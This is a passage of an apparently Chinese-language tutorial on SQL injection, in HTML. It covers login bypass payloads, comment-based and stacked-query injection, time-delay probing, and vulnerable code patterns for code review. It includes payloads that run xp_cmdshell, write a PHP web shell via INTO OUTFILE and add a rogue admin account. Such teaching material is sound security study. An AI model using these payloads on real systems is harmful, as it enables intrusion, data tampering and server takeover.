title=\"区别数字和字符串\"></a>区别数字和字符串</h4><p>数字不需要使用单引号来表示</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">FROM</span> products <span class=\"token keyword\">WHERE</span> idproduct<span class=\"token operator\">=</span><span class=\"token number\">3</span>\n<span class=\"token keyword\">SELECT</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">FROM</span> products <span class=\"token keyword\">WHERE</span> <span class=\"token keyword\">value</span> <span class=\"token operator\">&gt;</span> <span class=\"token number\">200</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>其他类型使用单引号来表示</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">FROM</span> products <span class=\"token keyword\">WHERE</span> name <span class=\"token operator\">=</span> <span class=\"token string\">'Bike'</span>\n<span class=\"token keyword\">SELECT</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">FROM</span> products <span class=\"token keyword\">WHERE</span> published_date<span class=\"token operator\">&gt;</span><span class=\"token string\">'01/01/2013'</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<h4 id=\"内联SQL注入\"><a href=\"#内联SQL注入\" class=\"headerlink\" title=\"内联SQL注入\"></a>内联SQL注入</h4><p>内联注入是指向查询注入一些SQL代码后，原来的代码仍然会全部执行</p>\n<h5 id=\"字符串内联注入\"><a href=\"#字符串内联注入\" class=\"headerlink\" title=\"字符串内联注入\"></a>字符串内联注入</h5><p>实例——用户提交用户和口令发送到数据库查询对用户进行验证</p>\n<p><img src=\"https://images.dadream.eu.org/images/2024/07/890687249876e3832a2b2b96b5398fe6.png\"></p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">查询语句\n<span class=\"token keyword\">SELECT</span> username<span class=\"token punctuation\">,</span> password <span class=\"token keyword\">FROM</span> users <span class=\"token keyword\">WHERE</span> username<span class=\"token operator\">=</span><span class=\"token string\">'$uname'</span> <span class=\"token operator\">and</span> password<span class=\"token operator\">=</span><span class=\"token string\">'$passwd'</span> <span class=\"token keyword\">LIMIT</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>单引号报错和前面一样</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">You have an error <span class=\"token operator\">in</span> your <span class=\"token keyword\">SQL</span> syntax<span class=\"token punctuation\">;</span> <span class=\"token keyword\">check</span> the manual that corresponds <span class=\"token keyword\">to</span> your MySQL server version <span class=\"token keyword\">for</span> the <span class=\"token keyword\">right</span> syntax <span class=\"token keyword\">to</span> <span class=\"token keyword\">use</span> near <span class=\"token string\">''''</span> <span class=\"token operator\">and</span> password<span class=\"token operator\">=</span><span class=\"token string\">''</span> <span class=\"token keyword\">LIMIT</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span>' at line <span class=\"token number\">1</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>这里可以直接<code>' or 1=1 #</code>绕过验证登录，但是要不改变sql语句的结构，就不能注释后面的语句</p>\n<p>这时<code>'or '1'='1</code>不会得到想要结果，因为and、or的优先级，and优先</p>\n<p><code>username='' or '1'='1 and password=''</code>按照</p>\n<p><code>username='' or ('1'='1' and password='')</code>执行</p>\n<p>所以改变payload<code>' or 1=1 or '1'='1</code> </p>\n<p>当只允许返回一行时，指定返回admin <code>'admin' and 1=1 or '1'='1</code></p>\n<p>在passwd字段注入，<code>'or '1'='1</code>返回所有行</p>\n<p><img src=\"https://images.dadream.eu.org/images/2024/07/6fd62d2c5717e94dd7bcba0e4342e9d9.png\"></p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">UPDATE</span> users\n<span class=\"token keyword\">SET</span> password <span class=\"token operator\">=</span> <span class=\"token string\">'new_password'</span>\n<span class=\"token keyword\">WHERE</span> username <span class=\"token operator\">=</span> <span class=\"token string\">'Bob'</span> <span class=\"token operator\">and</span> password <span class=\"token operator\">=</span> <span class=\"token string\">'old_password'</span> <span class=\"token operator\">OR</span> <span class=\"token string\">'1'</span><span class=\"token operator\">=</span> <span class=\"token string\">'1'</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p><code>' OR '1'= '1</code>是注入代码</p>\n<p>功能是将所有用户密码更新</p>\n<h5 id=\"数字值内联注入\"><a href=\"#数字值内联注入\" class=\"headerlink\" title=\"数字值内联注入\"></a>数字值内联注入</h5><pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> <span class=\"token operator\">*</span>\n<span class=\"token keyword\">FROM</span> messages\n<span class=\"token keyword\">WHERE</span> uid<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token keyword\">USER</span> ENTRY<span class=\"token punctuation\">]</span>\n<span class=\"token keyword\">ORDER</span> <span class=\"token keyword\">BY</span> received<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>少了引号的闭合，更简单了，直接构造永真返回全部<code>num or 1=1</code></p>\n<p><img src=\"https://images.dadream.eu.org/images/2024/07/8fd1fb2d04843d8266fc16528242a2fe.png\"></p>\n<p><img src=\"https://images.dadream.eu.org/images/2024/07/51d72d1c3f1546657dce86675b9594ed.png\"></p>\n<h4 id=\"终止式SQL注入\"><a href=\"#终止式SQL注入\" class=\"headerlink\" title=\"终止式SQL注入\"></a>终止式SQL注入</h4><p>攻击者在SQL注入代码时，通过注释掉剩余部分查询语句，从而结束原来的查询语句</p>\n<h5 id=\"数据库注释语法\"><a href=\"#数据库注释语法\" class=\"headerlink\" title=\"数据库注释语法\"></a>数据库注释语法</h5><p><img src=\"https://images.dadream.eu.org/images/2024/07/81720d0d80330ebb159aadb6ca6c3bd2.png\"></p>\n<p><code>/* */</code>可以用来绕过过滤空格</p>\n<p><code>1 or 1=1 </code>过滤空格变成<code>1or1=1</code></p>\n<p><code>/* */</code>绕过 <code>1/**/or/**/1=1</code></p>\n<p>还能用来检测SQL注入对注释的处理<code>id=1/*test*/</code>，没有影响话可能存在注入</p>\n<h5 id=\"使用注释\"><a href=\"#使用注释\" class=\"headerlink\" title=\"使用注释\"></a>使用注释</h5><p>使用前面相同的用户登录验证</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">查询语句\n<span class=\"token keyword\">SELECT</span> username<span class=\"token punctuation\">,</span> password <span class=\"token keyword\">FROM</span> users <span class=\"token keyword\">WHERE</span> username<span class=\"token operator\">=</span><span class=\"token string\">'$uname'</span> <span class=\"token operator\">and</span> password<span class=\"token operator\">=</span><span class=\"token string\">'$passwd'</span> <span class=\"token keyword\">LIMIT</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p><code>' or 1=1 -- </code> or  <code>' or 1=1 #</code>返回所有行</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> username<span class=\"token punctuation\">,</span> password <span class=\"token keyword\">FROM</span> users <span class=\"token keyword\">WHERE</span> username<span class=\"token operator\">=</span><span class=\"token string\">''</span> <span class=\"token operator\">or</span> <span class=\"token number\">1</span><span class=\"token operator\">=</span><span class=\"token number\">1</span> <span class=\"token comment\">-- ' and password='$passwd' LIMIT 0,1</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><code>admin';#</code>  冒充admin登录</p>\n<p><code>username=admin';/*'</code> <code>passwd=*/'</code>这种用于存在多个攻击参数</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">username <span class=\"token operator\">=</span> <span class=\"token string\">'admin'</span><span class=\"token punctuation\">;</span><span class=\"token operator\">/</span><span class=\"token operator\">*</span><span class=\"token string\">' AND passwd = '</span><span class=\"token operator\">/</span><span class=\"token operator\">*</span><span class=\"token string\">''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>注释后剩一对单引号，连接形成空字符串，对查询无影响</p>\n<p><img src=\"https://images.dadream.eu.org/images/2024/07/d88c49974a29200155cf33378156e89b.png\"></p>\n<p>可以用来判断数据库类型</p>\n<p><img src=\"https://images.dadream.eu.org/images/2024/07/a87270ed8be250f52c67e92a08d774e1.png\"></p>\n<h5 id=\"执行多条语句\"><a href=\"#执行多条语句\" class=\"headerlink\" title=\"执行多条语句\"></a>执行多条语句</h5><p>还有另一个名字，堆叠注入，终止了一条语句，可以创建一条全新的没有限制的语句，简单说就是将原始语句结束，在后面加几条新语句</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">select</span> a <span class=\"token keyword\">from</span> q<span class=\"token punctuation\">;</span><span class=\"token keyword\">select</span> b <span class=\"token keyword\">from</span> w<span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>mssql 6.0后允许在同一连接句柄上执行包含多条语句的字符串，Mysql 4.1后也引入该功能，默认不开启，Oracle不支持，除非使用PL/SQL</p>\n<p>运用前面having 1=1和group up 技术</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">……id<span class=\"token operator\">=</span><span class=\"token number\">22</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> admin <span class=\"token keyword\">having</span> <span class=\"token number\">1</span><span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span><span class=\"token comment\">-- +</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>还有其他可利用技术</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">INSERT</span> <span class=\"token keyword\">INTO</span> administrators <span class=\"token punctuation\">(</span>username<span class=\"token punctuation\">,</span> password<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">VALUES</span> <span class=\"token punctuation\">(</span><span class=\"token string\">'hacker'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'mysecretpassword'</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">?uid<span class=\"token operator\">=</span><span class=\"token number\">45</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">exec</span> master<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>xp_cmdshell <span class=\"token string\">'ping www.google.com'</span><span class=\"token punctuation\">;</span><span class=\"token comment\">-- </span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> <span class=\"token string\">'&lt;?php echo shell_exec($_GET[\"cmd\"]);?&gt;'</span>\n<span class=\"token keyword\">INTO</span> <span class=\"token keyword\">OUTFILE</span> <span class=\"token string\">'/var/www/victim.com/shell.php'</span><span class=\"token punctuation\">;</span><span class=\"token comment\">--</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://images.dadream.eu.org/images/2024/07/3a91874d8bb2d2ad880d89fdd1f51473.png\"></p>\n<h4 id=\"时间延迟\"><a href=\"#时间延迟\" class=\"headerlink\" title=\"时间延迟\"></a>时间延迟</h4><p>没有回显和报错信息被隐藏的时候，可以向数据库注入时间延迟，数据库返回的时间反映在web页面，用来确定是否有SQL注入</p>\n<p>mssql内置的设置延迟的命令<code>waitfor delay 'hours:minutes:seconds'</code></p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">?id<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">waitfor</span> delay <span class=\"token string\">'0:0:5'</span><span class=\"token punctuation\">;</span><span class=\"token comment\">-- </span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>这个payload意义就是让数据库延迟5秒返回数据</p>\n<p>mysql种没有时间延迟的函数，它使用一些执行时间很长的函数，来引入延迟。比如<code>benchmark</code></p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">benchmark<span class=\"token punctuation\">(</span><span class=\"token number\">10000</span><span class=\"token punctuation\">,</span>encode<span class=\"token punctuation\">(</span><span class=\"token string\">'test'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'tets'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>将后面的命令执行10000次，这样时间就长了，为了更明显，可以增大次数</p>\n<p>oracle PL/SQL</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">BEGIN</span>\nDBMS_LOCK<span class=\"token punctuation\">.</span>SLEEP<span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">#休眠五秒</span>\n<span class=\"token keyword\">END</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>限制：不能直接子查询，管理员才能使用DBMS_LOCK包</p>\n<p>另一个方法</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">?id<span class=\"token operator\">=</span><span class=\"token number\">32</span> <span class=\"token operator\">or</span> l<span class=\"token operator\">=</span>dbms_pipe<span class=\"token punctuation\">.</span>receive_ message<span class=\"token punctuation\">(</span><span class=\"token string\">'RDS'</span><span class=\"token punctuation\">,</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>DBMS_PIPE.RECEIVE_MESSAGE函数将为从RDS管道返回的数据等待10秒</p>\n<p>PostgreSQL</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">pg_sleep<span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"自动寻找SQL注入\"><a href=\"#自动寻找SQL注入\" class=\"headerlink\" title=\"自动寻找SQL注入\"></a>自动寻找SQL注入</h3><ul>\n<li>识别数据输入</li>\n<li>注入数据</li>\n<li>检测响应中的异常</li>\n</ul>\n<h4 id=\"工具\"><a href=\"#工具\" class=\"headerlink\" title=\"工具\"></a>工具</h4><h5 id=\"HP-WebInspect\"><a href=\"#HP-WebInspect\" class=\"headerlink\" title=\"HP WebInspect\"></a>HP WebInspect</h5><h5 id=\"IBM-Rational-AppScan\"><a href=\"#IBM-Rational-AppScan\" class=\"headerlink\" title=\"IBM Rational AppScan\"></a>IBM Rational AppScan</h5><h5 id=\"HP-Scrawlr\"><a href=\"#HP-Scrawlr\" class=\"headerlink\" title=\"HP Scrawlr\"></a>HP Scrawlr</h5><h5 id=\"SQLiX\"><a href=\"#SQLiX\" class=\"headerlink\" title=\"SQLiX\"></a>SQLiX</h5><h5 id=\"Paros-Proxy-Zed-Attack-Proxy\"><a href=\"#Paros-Proxy-Zed-Attack-Proxy\" class=\"headerlink\" title=\"Paros Proxy/Zed Attack Proxy\"></a>Paros Proxy/Zed Attack Proxy</h5><h2 id=\"复查代码中的SQL注入\"><a href=\"#复查代码中的SQL注入\" class=\"headerlink\" title=\"复查代码中的SQL注入\"></a>复查代码中的SQL注入</h2><p>在代码中找bug，有代码审计的味道，审计的是sql代码</p>\n<h3 id=\"复查源代码中的SQL注入\"><a href=\"#复查源代码中的SQL注入\" class=\"headerlink\" title=\"复查源代码中的SQL注入\"></a>复查源代码中的SQL注入</h3><ul>\n<li>静态代码分析：分析源代码，但不执行</li>\n<li>动态代码分析：在执行代码是分析</li>\n<li>渗入点(安全敏感函数)：易受攻击的位置</li>\n</ul>\n<p>从渗入点进入审查，找到注入参数的位置，分析函数</p>\n<h4 id=\"危险的编码行为\"><a href=\"#危险的编码行为\" class=\"headerlink\" title=\"危险的编码行为\"></a>危险的编码行为</h4><h5 id=\"将未验证的输入拼接成SQL语句并执行\"><a href=\"#将未验证的输入拼接成SQL语句并执行\" class=\"headerlink\" title=\"将未验证的输入拼接成SQL语句并执行\"></a>将未验证的输入拼接成SQL语句并执行</h5><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token comment\">//在PHP中执行一条动态构造的SQL语句</span>\n<span class=\"token function\">mysql_query</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"SELECT * FROM table WHERE field = '<span class=\"token interpolation\"><span class=\"token variable\">$_GET</span></span>[\"</span>input\"<span class=\"token punctuation\">]</span>'<span class=\"token punctuation\">;</span> <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-c#\" data-language=\"c#\"><code class=\"language-c#\">//在C#中执行一条动态构造的SQL语句\nSqlCommand command = new SqlCommmand(\"SELECT * FROM table WHERE field = '\" + request.getParameter (\"input\") + \"'\" ,connection); <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token comment\">//在Java中执行一条动态构造的SQL语句</span>\n<span class=\"token class-name\">ResultSet</span> rs <span class=\"token operator\">=</span> s<span class=\"token punctuation\">.</span><span class=\"token function\">executeQuery</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"SELECT * FROM table WHERE field = '\"</span> <span class=\"token operator\">+</span> request<span class=\"token punctuation\">.</span>getParameter <span class=\"token punctuation\">(</span><span class=\"token string\">\"input\"</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"'\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<h5 id=\"存储过程也会有SQL注入\"><a href=\"#存储过程也会有SQL注入\" class=\"headerlink\" title=\"存储过程也会有SQL注入\"></a>存储过程也会有SQL注入</h5><pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token comment\">// MS SQL Server中易受攻击的存储过程</span>\n<span class=\"token keyword\">CREATE</span> <span class=\"token keyword\">PROCEDURE</span> SP_StoredProcedure <span class=\"token variable\">@input</span> <span class=\"token keyword\">varchar</span><span class=\"token punctuation\">(</span><span class=\"token number\">400</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token boolean\">NULL</span> <span class=\"token keyword\">AS</span>\n<span class=\"token keyword\">DECLARE</span> <span class=\"token variable\">@sql</span> nvarchar<span class=\"token punctuation\">(</span><span class=\"token number\">4000</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">SELECT</span> <span class=\"token variable\">@sql</span> <span class=\"token operator\">=</span> <span class=\"token string\">'SELECT field FROM table WHERE field ='''</span><span class=\"token operator\">+</span> <span class=\"token variable\">@input</span> <span class=\"token operator\">+</span> <span class=\"token string\">''''</span>\n<span class=\"token keyword\">EXEC</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">@sql</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token comment\">// MySQL中易受攻击的存储过程</span>\n<span class=\"token keyword\">CREATE</span> <span class=\"token keyword\">PROCEDURE</span> SP_StoredProcedure <span class=\"token punctuation\">(</span>input <span class=\"token keyword\">varchar</span><span class=\"token punctuation\">(</span><span class=\"token number\">400</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">BEGIN</span>\n<span class=\"token keyword\">SET</span> <span class=\"token variable\">@param</span> <span class=\"token operator\">=</span> input<span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">SET</span> <span class=\"token variable\">@sql</span> <span class=\"token operator\">=</span> concat<span class=\"token punctuation\">(</span><span class=\"token string\">'SELECT field FROM table WHERE field='</span><span class=\"token punctuation\">,</span><span class=\"token variable\">@param</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">PREPARE</span> stmt <span class=\"token keyword\">FROM</span> <span class=\"token variable\">@sql</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">EXECUTE</span> stmt<span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">DEALLOCATE</span> <span class=\"token keyword\">PREPARE</span> stmt<span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">End</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token comment\">--Oracle中易受攻击的存储过程</span>\n<span class=\"token keyword\">CREATE</span> <span class=\"token operator\">OR</span> <span class=\"token keyword\">REPLACE</span> <span class=\"token keyword\">PROCEDURE</span> SP_StoredProcedure <span class=\"token punctuation\">(</span>input <span class=\"token operator\">IN</span> VARCHAR2<span class=\"token punctuation\">)</span> <span class=\"token keyword\">AS</span> <span class=\"token keyword\">sql</span> VARCHAR2<span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">BEGIN</span>\n<span class=\"token keyword\">sql</span> :<span class=\"token operator\">=</span><span class=\"token string\">'SELECT field FROM table WHERE field = '''</span> <span class=\"token operator\">||</span> input <span class=\"token operator\">||</span> <span class=\"token string\">''''</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">EXECUTE</span> IMMEDIATE <span class=\"token keyword\">sql</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">END</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token comment\">//在PHP中动态地执行SQL存储过程</span>\n<span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysql_query</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"select SP_StoredProcedure(<span class=\"token interpolation\"><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'input'</span><span class=\"token punctuation\">]</span></span>)\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n<span class=\"token comment\">//在C#中动态地执行SQL存储过程</span>\nSqlCommand cmd <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">SqlCommand</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"SP_StoredProceduren\"</span><span class=\"token punctuation\">,</span> conn<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\ncmd<span class=\"token operator\">.</span>CommandType <span class=\"token operator\">=</span> CommandType<span class=\"token operator\">.</span>StoredProcedure<span class=\"token punctuation\">;</span>\ncmd<span class=\"token operator\">.</span>Parameters<span class=\"token operator\">.</span><span class=\"token function\">Add</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">SqlParameter</span> <span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"@input\"</span><span class=\"token punctuation\">,</span>\nrequest<span class=\"token operator\">.</span><span class=\"token function\">getParameter</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"input\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nSqlDataReader rdr <span class=\"token operator\">=</span> cmd<span class=\"token operator\">.</span><span class=\"token function\">ExecteReader</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//在Java中动态地执行SQL存储过程</span>\nCallableStatement cs <span class=\"token operator\">=</span> con<span class=\"token operator\">.</span><span class=\"token function\">prepareCall</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"{call SP_StoredProcedure request.getParameter(\"</span>input<span class=\"token string double-quoted-string\">\")}\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword type-declaration\">string</span> output <span class=\"token operator\">=</span> cs<span class=\"token operator\">.</span><span class=\"token function\">executeUpdate</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h5 id=\"PHP中HTTP函数\"><a href=\"#PHP中HTTP函数\" class=\"headerlink\" title=\"PHP中HTTP函数\"></a>PHP中HTTP函数</h5><p>php表单提交有两种方式：GET、POST</p>\n<p>GET方式显式提交，地址栏可以看到请求参数，并且有大小限制</p>\n<p><code>test.php?id=1&amp;num=2</code></p>\n<p>POST隐式提交，需要抓包才能看到参数，没有大小限制</p>\n<p><code>&amp;</code> <code>;</code>分割参数，<code>=</code>分割参数名称和值</p>\n<p>一种特殊的参数<code>cookie</code>通常保存在服务器上用于验证</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token variable\">$_GET</span>：一个关联数组，存放通过<span class=\"token constant\">HTTP</span> <span class=\"token constant\">GET</span>方法传递的变量。\n<span class=\"token variable\">$var</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$HTTP_GET_VARS</span>：与<span class=\"token variable\">$_GET</span>相同，在<span class=\"token constant\">PHP</span> <span class=\"token number\">4.1</span><span class=\"token number\">.0</span> 中已弃用。\n<span class=\"token variable\">$var</span><span class=\"token operator\">=</span><span class=\"token variable\">$HTTP_GET_VARS</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$_POST</span>：一个关联数组，存放通过<span class=\"token constant\">HTTP</span> <span class=\"token constant\">POST</span>方法传递的变量。\n<span class=\"token variable\">$var</span><span class=\"token operator\">=</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$HTTP_POST_VARS</span>：与<span class=\"token variable\">$_POST</span> 相同，在<span class=\"token constant\">PHP</span> <span class=\"token number\">4.1</span><span class=\"token number\">.0</span> 中已弃用。\n<span class=\"token variable\">$var</span><span class=\"token operator\">=</span><span class=\"token variable\">$HTTP_POST_VARS</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$_REQUEST</span>：一个关联数组，包含<span class=\"token variable\">$_GET</span>、$ <span class=\"token constant\">POST</span>和<span class=\"token variable\">$_</span>（：<span class=\"token number\">001</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">^</span>的内容。\n<span class=\"token variable\">$var</span><span class=\"token operator\">=</span><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$_COOKIE</span>：一个关联数组，存放通过<span class=\"token constant\">HTTP</span> cookie传递给当前脚本的变量。\n<span class=\"token variable\">$var</span><span class=\"token operator\">=</span><span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$HTTP_COOKIE_VARS</span>：与<span class=\"token variable\">$_COOKIE</span>相同，在<span class=\"token constant\">PHP</span> <span class=\"token number\">4.1</span><span class=\"token number\">.0</span> 中已弃用。\n<span class=\"token variable\">$var</span><span class=\"token operator\">=</span><span class=\"token variable\">$HTTP_COOKIE_VARS</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$_SERVER</span>：服务器及执行环境的信息。\n<span class=\"token variable\">$var</span><span class=\"token operator\">=</span><span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$HTTP_SERVER_VARS</span>：与<span class=\"token 